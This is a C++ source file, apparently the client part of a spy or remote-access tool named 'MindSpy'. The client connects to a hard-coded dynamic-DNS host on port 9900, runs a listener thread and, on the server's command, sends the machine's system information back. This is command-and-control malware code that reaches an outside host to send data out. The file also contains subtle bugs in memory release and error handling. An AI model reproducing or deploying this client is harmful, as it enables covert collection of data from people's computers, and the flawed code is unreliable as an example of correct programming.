#include "Conector.h"

namespace MindSpy
{
	Conector::Conector() {
		// Inicializar sockets
		WSAStartup(MAKEWORD(2, 2), &wsd);
		// Obtener la dirección IP del servidor
		hostent *he = gethostbyname("mindspy.hopto.org");
		in_addr * DirTemp = (in_addr *)he->h_addr;
		string sDirTemp = inet_ntoa(*DirTemp);
		// Crear un nuevo socket para el servidor donde se asigna IP, protocolo y puerto
		sckt = socket(AF_INET, SOCK_STREAM, 0);
		server.sin_addr.s_addr = inet_addr(sDirTemp.c_str());
		server.sin_family = AF_INET;
		server.sin_port = htons(9900);
		// Conectar al socket
		Conectado = connect(sckt, (sockaddr*)&server, sizeof(server)) != SOCKET_ERROR;
		// Iniciar el hilo de escucha
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)HiloProc, (LPVOID)this, NULL, NULL);
	}

	Conector::~Conector() {
		// Cerrar el socket
		EnviarComando(NULL, CLNT_CMDS::CLOSE, NULL);
		closesocket(sckt);
	}

	bool Conector::Listo()
	{
		return Conectado;
	}

	bool Conector::EnviarComando(UINT32 SizeofData, UINT32 comando, BYTE* Data)
	{
		/*
			La estructura de los paquetes a enviar, es siempre la misma, independientemente de
			los datos a enviar. Sin embargo, el tamaño de dichos datos puede variar.
			
			Los primeros cuatro bytes del paquete, corresponden al tamaño del paquete. Los segundos
			cuatro bytes corresponden al comando asociado a la data y del octavo byte en adelante,
			se ubica la data a enviar.
		*/

		// Se reserva memoria para el tamaño de la data + el opcode (comando) + data
		BYTE *DataToSend = (BYTE*)VirtualAlloc(NULL, SizeofData + 8, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		// Se mueven a los primeros 4 bytes (unsigned short), el tamaño del paquete
		*(UINT32*)DataToSend = SizeofData;
		// Se mueve el comando a los siguientes 4 bytes
		*(UINT32*)(DataToSend + 4) = comando;
		// Se copia la data pasada por parámetro a la memoria reservada
		if (Data)
			memcpy(DataToSend+8, Data, SizeofData);
		// Se envian los datos
		bool r = send(sckt, (const char*)DataToSend, SizeofData+8, 0) != SOCKET_ERROR;
		// Se libera la memoria
		VirtualFree(DataToSend, SizeofData, MEM_RELEASE);
		return r;
	}

	int Conector::TipoComando(const char*c)
	{
		// Comandos disponibles
		char Comandos[CANTIDAD_COMANDOS][16] = { "CLOSE", "NAME", "VERSION", "SYSINFO" };
		// Se compara comando por comando y se regresa su ID, en caso de que exista
		for (int i = 0; i < CANTIDAD_COMANDOS; i++) {
			if (!strcmp(Comandos[i], c)) return i;
		}
		// Si no se encontró ninguno...
		return COMANDO_NO_EXISTENTE;
	}

	void Conector::Escuchar()
	{
		while (true)
		{
			char Mensaje[MAX_BUFFER];
			ZeroMemory(Mensaje, sizeof(Mensaje));
			int resp = recv(sckt, Mensaje, sizeof(Mensaje), 0);
			if (resp <= 0)
			{
				Conectado = false;
				break;
			}

			UINT32 comando = *(UINT32*)(Mensaje+4);

			switch (comando)
			{
			case CLNT_CMDS::VERSION: 
				EnviarComando(strlen(VERSION_CLIENTE) + 1, CLNT_CMDS::VERSION, (BYTE*)VERSION_CLIENTE);
				break;

			case CLNT_CMDS::SYSINFO:
				EnviarComando(sizeof(stSystemInfoResponse), CLNT_CMDS::SYSINFO, (BYTE*)&sys.getInfo());
				break;

			case CLNT_CMDS::CLOSE:
				EnviarComando(0, CLNT_CMDS::CLOSE, NULL);
				return;

			case CLNT_CMDS::NAME:
				break;
				 
			}
		}
	}
};